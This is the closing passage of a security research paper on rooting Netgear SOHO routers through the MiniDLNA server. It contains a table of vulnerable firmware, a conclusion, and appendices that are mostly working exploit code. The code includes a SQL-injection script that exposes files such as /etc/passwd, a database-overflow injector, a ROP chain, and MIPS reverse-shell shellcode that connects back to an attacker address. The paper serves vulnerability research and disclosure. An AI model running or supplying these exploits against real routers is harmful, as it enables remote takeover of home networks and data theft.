  several	
  different	
  Netgear	
SOHO	
  Routers.	
  For	
  each	
  router	
  I	
  analyzed	
  the	
  two	
  most	
  recent	
  firmware	
  update	
  files	
  available	
  on	
  the	
vendor’s	
  support	
  website.	
  I	
  focused	
  only	
  on	
  devices	
  that	
  provided	
  the	
  DLNA	
  capability.	
  Although	
  the	
WNDR3700v3	
  is	
  the	
  only	
  device	
  for	
  which	
  I	
  developed	
  and	
  tested	
  the	
  exploits,	
  all	
  the	
  devices	
  and	
firmware	
  versions	
  I	
  analyzed	
  appear	
  to	
  be	
  vulnerable	
  based	
  on	
  disassembly	
  and	
  static	
  analysis.	
The	
  following	
  table	
  describes	
  the	
  devices	
  and	
  their	
  respective	
  firmware	
  versions	
  that	
  appear	
  to	
  be	
vulnerable.	
Router	
  Model	
Firmware	
Version	
MiniDLNA	
Version	
Performed	
Static	
  Analysis	
Vulnerable	
Developed	
Exploits	
WNDR3700v3	
1.0.0.18	
1.0.18	
Yes	
Yes	
Yes	
1.0.0.22	
1.0.18	
Yes	
Yes	
WNDR3800	
1.0.0.18	
1.0.19	
Yes	
Yes	
1.0.0.24	
1.0.19	
Yes8	
Yes	
WNDR4000	
1.0.0.82	
1.0.18	
Yes	
Yes	
1.0.0.88	
1.0.18	
Yes	
Yes	
WNDR4500	
1.0.0.70	
1.0.18	
Yes	
Yes	
1.0.1.6	
1.0.18	
Yes	
Yes	
In	
  total,	
  I	
  found	
  eight	
  separate	
  firmware	
  versions	
  across	
  four	
  separate	
  device	
  models	
  that	
  contain	
  the	
vulnerable	
  executable.	
Conclusion 
As	
  we	
  have	
  seen,	
  there	
  are	
  a	
  number	
  of	
  readily	
  exploitable	
  vulnerabilities	
  in	
  Netgear’s	
  MiniDLNA	
  server	
and	
  Netgear’s	
  wireless	
  routers.	
  It	
  is	
  easy	
  pass	
  over	
  an	
  attack	
  that	
  yields	
  little	
  direct	
  value,	
  such	
  as	
  the	
SQL	
  injection	
  shown	
  earlier.	
  However,	
  I	
  have	
  clearly	
  shown	
  two	
  practical	
  and	
  useful	
  attacks	
  that	
become	
  possible	
  when	
  combined	
  with	
  the	
  first.	
  Just	
  as	
  significantly,	
  I	
  have	
  presented	
  analysis	
techniques	
  that	
  can	
  be	
  applied	
  to	
  a	
  variety	
  of	
  embedded	
  devices	
  for	
  vulnerability	
  research	
  and	
  exploit	
development.	
The	
  first	
  known	
  hostile	
  exploitation	
  of	
  a	
  buffer	
  overflow	
  was	
  by	
  the	
  Morris	
  worm	
  in	
  19889.	
  Yet,	
  twenty-­‐
four	
  years	
  later,	
  buffer	
  overflows	
  continue	
  to	
  be	
  as	
  important	
  as	
  ever.	
  Moreover,	
  oft-­‐overlooked	
embedded	
  devices	
  such	
  as	
  SOHO	
  routers	
  are	
  among	
  the	
  most	
  critical	
  systems	
  on	
  users’	
  networks.	
Vulnerabilities	
  found	
  within,	
  such	
  as	
  those	
  I	
  have	
  described	
  in	
  this	
  paper,	
  have	
  the	
  potential	
  to	
  expose	
  a	
great	
  many	
  users	
  to	
  exploitation.	
8	
  The	
  MD5	
  digest	
  for	
  the	
  minidlna	
  executable	
  unpacked	
  from	
  WNDR3800	
  firmware	
  version	
  10.0.0.24	
  matches	
  the	
digest	
  from	
  firmware	
  10.0.0.18,	
  so	
  no	
  additional	
  static	
  analysis	
  is	
  required.	
9	
  http://web.archive.org/web/20070520233435/http://world.std.com/~franl/worm.html	
SQL	
  Injection	
  to	
  MIPS	
  Overflows:	
  Rooting	
  SOHO	
  Routers	
Zachary	
  Cutlip	
21 
Appendix A	
The	
  following	
  program	
  exploits	
  a	
  SQL	
  injection	
  vulnerability	
  to	
  enable	
  convenient	
  file	
  extraction	
  from	
the	
  target.	
  It	
  may	
  be	
  invoked	
  as	
  follows:	
$ ./albumartinject.py ‘/etc/passwd’ 
An	
  HTTP	
  URL	
  is	
  then	
  displayed	
  for	
  use	
  with	
  the	
  wget	
  command.	
#!/usr/bin/env python 
import os 
import sys 
import urllib,socket,os,httplib 
import time 
headers={"Host":"10.10.10.1"} 
host="10.10.10.1" 
album_art_path='/AlbumArt' 
inject_id="31337" 
port=8200 
path_beginning=album_art_path+'/1;' 
path_ending='-18.jpg' 
class Logging: 
    WARN=0 
    INFO=1 
    DEBUG=2 
    log_level=2 
    prefixes=[] 
    prefixes.append(" [!] ") 
    prefixes.append(" [+] ") 
    prefixes.append(" [@] ") 
    @classmethod 
    def log_msg(klass,msg,level=INFO): 
        if klass.log_level>=level: 
            pref=Logging.prefixes[level] 
            print pref+msg 
def log(msg): 
    Logging.log_msg(msg) 
def log_debug(msg): 
    Logging.log_msg(msg,Logging.DEBUG) 
def log_warn(msg): 
    Logging.log_msg(msg,Logging.WARN) 
def usage(): 
    usage="Usage: %s [FILE]\nInject a database record allowing HTTP access to FILE.\n" % 
os.path.basename(sys.argv[0]) 
    print usage 
def build_request(query): 
    request=path_beginning+query+path_ending 
    return request 
def do_request(request): 
    log_debug("Requesting:") 
    log_debug(request) 
    conn=httplib.HTTPConnection(host,port) 
    conn.request("GET",request,"",headers) 
    resp=conn.getresponse() 
    data=resp.read() 
    conn.close() 
    return data 
try: 
    desired_file=sys.argv[1] 
except IndexError: 
    usage() 
    exit(1) 
SQL	
  Injection	
  to	
  MIPS	
  Overflows:	
  Rooting	
  SOHO	
  Routers	
Zachary	
  Cutlip	
22 
log("Requested file is: "+desired_file) 
albumart_insert_query='insert/**/into/**/ALBUM_ART(ID,PATH)'+\ 
                    '/**/VALUES("'+inject_id+'","'+desired_file+'");' 
albumart_delete_query='delete/**/from/**/ALBUM_ART/**/where/**/ID="'+inject_id+'";' 
log("Deleting old record.") 
request=build_request(albumart_delete_query) 
resp=do_request(request) 
log_debug(resp) 
log("Injecting ALBUM_ART record.") 
request=build_request(albumart_insert_query) 
resp=do_request(request) 
log_debug(resp) 
log("Injection complete.") 
log("You may access "+desired_file) 
log("via the URL http://%s:%d%s/%s-18.jpg"%(host,port,album_art_path,inject_id)) 
SQL	
  Injection	
  to	
  MIPS	
  Overflows:	
  Rooting	
  SOHO	
  Routers	
Zachary	
  Cutlip	
23 
Appendix B 
#!/usr/bin/env python 
#AAAAinject.py 
# Author: Zachary Cutlip 
#         PI:EMAIL 
#         twitter: @zcutlip 
#This script injects a buffer overflow into the ALBUM_ART table of 
#MiniDLNA's SQLite database.  When queried with the proper soap request, 
#this buffer overflow demonstrates arbitrary code execution by placing a  
#string of user-controlled 'A's in the CPU's program counter.  This 
#affects MiniDLNA version 1.0.18 as shipped with Netgear WNDR3700 version 3. 
import math 
import sys 
import urllib,socket,os,httplib 
import time 
from overflow_data import DlnaOverflowBuilder 
headers={"Host":"10.10.10.1"} 
host="10.10.10.1" 
COUNT=8 
LEN=128 
empty='' 
overflow_strings=[] 
overflow_strings.append("AA") 
overflow_strings.append("A"*LEN) 
overflow_strings.append("B"*LEN) 
overflow_strings.append("C"*LEN) 
overflow_strings.append("D"*LEN) 
overflow_strings.append("A"*LEN) 
overflow_strings.append("\x10\x21\x76\x15"*(LEN/4)) 
overflow_strings.append("\x10\x21\x76\x15"*(LEN/4)) 
overflow_strings.append("D"*LEN) 
overflow_strings.append("D"*LEN) 
overflow_strings.append("D"*LEN) 
path_beginning='/AlbumArt/1;' 
path_ending='-18.jpg' 
details_insert_query='insert/**/into/**/DETAILS(ID,SIZE,TITLE,ARTIST,ALBUM'+\ 
                      ',TRACK,DLNA_PN,MIME,ALBUM_ART,DISC)/**/VALUES("31337"'+\ 
                      ',"PWNED","PWNED","PWNED","PWNED","PWNED","PWNED"'+\ 
                      ',"PWNED","1","PWNED");' 
objects_insert_query='insert/**/into/**/OBJECTS(OBJECT_ID,PARENT_ID,CLASS,DETAIL_ID)'+\ 
                    '/**/VALUES("PWNED","PWNED","container","31337");' 
details_delete_query='delete/**/from/**/DETAILS/**/where/**/ID="31337";' 
objects_delete_query='delete/**/from/**/OBJECTS/**/where/**/OBJECT_ID="PWNED";' 
def build_injection_req(query): 
    request=path_beginning+query+path_ending 
    return request 
def do_get_request(request): 
    conn=httplib.HTTPConnection(host,8200) 
    conn.request("GET",request,"",headers) 
    conn.close() 
def build_update_query(string): 
        details_update_query='update/**/DETAILS/**/set/**/ALBUM_ART=ALBUM_ART'+\ 
                '||"'+string+'"/**/where/**/ID="31337";' 
        return details_update_query 
def clear_overflow_data(): 
    print "Deleting existing overflow data..." 
    request=build_injection_req(details_delete_query) 
    do_get_request(request) 
    request=build_injection_req(objects_delete_query) 
    do_get_request(request) 
    time.sleep(1) 
SQL	
  Injection	
  to	
  MIPS	
  Overflows:	
  Rooting	
  SOHO	
  Routers	
Zachary	
  Cutlip	
24 
def insert_overflow_data(): 
    print("Setting up initial database records....") 
    request=build_injection_req(objects_insert_query) 
    do_get_request(request) 
    request=build_injection_req(details_insert_query) 
    do_get_request(request) 
    print("Building long ALBUM_ART string.") 
    for string in overflow_strings: 
        req=build_injection_req(build_update_query(string)) 
        do_get_request(req) 
clear_overflow_data() 
insert_overflow_data() 
SQL	
  Injection	
  to	
  MIPS	
  Overflows:	
  Rooting	
  SOHO	
  Routers	
Zachary	
  Cutlip	
25 
Appendix C 
#!/usr/bin/env python 
#dlnaclient.py 
#  A program browse the content directory for a specific object 
#  Use to analyze DLNA conversation in order to identify appropriate 
#  SOAP request to query the desired object. 
#  Author: Zachary Cutlip 
#          PI:EMAIL 
#          Twitter: @zcutlip 
from twisted.internet import reactor 
from coherence.base import Coherence 
from coherence.upnp.devices.control_point import ControlPoint 
from coherence.upnp.core import DIDLLite 
# called for each media server found 
def media_server_found(client, udn): 
    print "media_server_found", client 
    d = client.content_directory.browse('PWNED', 
            browse_flag='BrowseDirectChildren', requested_count=100,process_result=False, 
            backward_compatibility=False) 
def media_server_removed(udn): 
    print "media_server_removed", udn 
def start(): 
    control_point = ControlPoint(Coherence({'logmode':'warning'}), 
            auto_client=['MediaServer']) 
    control_point.connect(media_server_found, 
            'Coherence.UPnP.ControlPoint.MediaServer.detected') 
    control_point.connect(media_server_removed, 
            'Coherence.UPnP.ControlPoint.MediaServer.removed') 
if __name__ == "__main__": 
    reactor.callWhenRunning(start) 
    reactor.run() 
SQL	
  Injection	
  to	
  MIPS	
  Overflows:	
  Rooting	
  SOHO	
  Routers	
Zachary	
  Cutlip	
26 
Appendix D 
soaprequest.xml: 
        PWNED 
        BrowseDirectChildren 
        * 
        0 
        100 
SQL	
  Injection	
  to	
  MIPS	
  Overflows:	
  Rooting	
  SOHO	
  Routers	
Zachary	
  Cutlip	
27 
Appendix E 
# exploitbuffer.py 
# Author: Zachary Cutlip 
#         PI:EMAIL 
#         Twitter: @zcutlip 
# An exploit buffer and reverse TCP connect-back payload 
# targetting vulnerable callback() funcgion in 
# MiniDLNA version 1.0.18 as shipped with Netgear WNDR3700 version 3. 
#  Connect-back IP address: 10.10.10.10 
#                    Port:  31337 
class DlnaOverflowBuilder: 
    MIPSNOPSTRING="\x27\x70\xc0\x01"*8 
    pattern128_1="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8"+ 
    "Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae" 
    pattern128_2="2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1"+ 
    "Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A" 
    pattern128_3="i5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4"+ 
    "Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7" 
    pattern128_4="Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao"+ 
    "7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar" 
    pattern40_5="0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3" 
    pattern40_5="0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3" 
    pattern8_6="As4A6As7" 
    pattern16_7="0At1At2At3At4At5" 
    pattern28_8="t7At8At9Au0Au1Au2Au3Au4Au5Au" 
    pattern32_9="8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7" 
    pattern64_10="o9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar" 
    pattern40_11="2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5" 
    connect_back=["\xfd\xff\x0f\x24\x27", 
    "x'20'", #SQL escape 
    "\xe0\x01\x27\x28\xe0\x01\xff\xff\x06\x28", 
    "\x57\x10\x02\x24\x0c\x01\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f", 
    "\xfd\xff\x0f\x24\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x7a\x69\x0e\x3c", 
    "\x7a\x69\xce\x35\xe4\xff\xae\xaf\x0a\x0a", 
    "x'0d'", #SQL escape 
    "\x3c\x0a\x0a\xad\x35", 
    "\xe6\xff\xad\xaf\xe2\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01", 
    "\x4a\x10\x02\x24\x0c\x01\x01\x01\xfd\xff\x0f\x24\x27\x28\xe0\x01", 
    "\xff\xff\xa4\x8f\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff\xff\xa5", 
    "x'20'", #SQL escape 
    "\xff\xff\x01\x24\xfb\xff\xa1\x14\xff\xff\x06\x28\x62\x69\x0f\x3c", 
    "\x2f\x2f\xef\x35\xf4\xff\xaf\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35", 
    "\xf8\xff\xae\xaf\xfc\xff\xa0\xaf\xf4\xff\xa4\x27\xd8\xff\xa4\xaf", 
    "\xff\xff\x05\x28\xdc\xff\xa5\xaf\xd8\xff\xa5\x27\xab\x0f\x02\x24", 
    "\x0c\x01\x01\x01\xff\xff\x06\x28"] 
    def initial_overflow(self): 
        overflow_data=[] 
        overflow_data.append("AA") 
        overflow_data.append(self.pattern128_1) 
        overflow_data.append(self.pattern128_2) 
        overflow_data.append(self.pattern128_3) 
        overflow_data.append(self.pattern128_4) 
        overflow_data.append(self.pattern40_5) 
        return overflow_data 
SQL	
  Injection	
  to	
  MIPS	
  Overflows:	
  Rooting	
  SOHO	
  Routers	
Zachary	
  Cutlip	
28 
    def rop_chain(self): 
        ropchain=[] 
        #jalr s6 
        ropchain.append("\xac\x02\x12\x2b") 
        ropchain.append(self.pattern8_6) 
        #cacheflush() 
        ropchain.append("\xb8\xdf\xf3\x2a") 
        #jalr s0 
        ropchain.append("\xc4\x41\x0e\x2b") 
        ropchain.append(self.pattern16_7) 
        #move t9,s3 
        #jalr t9 
        ropchain.append("\x08\xde\x16\x2b") 
        ropchain.append(self.pattern28_8) 
        #load offset from sp into S6, then jalr S1 
        ropchain.append("\x30\x9d\x11\x2b") 
        ropchain.append(self.pattern32_9) 
        #load offset from sp into S6, then jalr S1 
        ropchain.append("\x30\x9d\x11\x2b") 
        ropchain.append(self.pattern64_10) 
        ropchain.append("abcd") 
        #avoid crashing memcpy 
        ropchain.append("\x32\xc9\xa3\x15") 
        ropchain.append("D"*12) 
        ropchain.append("\x32\xc9\xa3\x15") 
        ropchain.append(self.pattern128_1) 
        ropchain.append(self.pattern40_11) 
        return ropchain 
    def payload(self): 
        payload=[] 
        for i in xrange(0,1): 
            payload.append(self.MIPSNOPSTRING) 
        for string in self.connect_back: 
            payload.append(string) 
        #for debugging purposes so we can locate our shellcode in memory 
        payload.append("D"*4) 
        return payload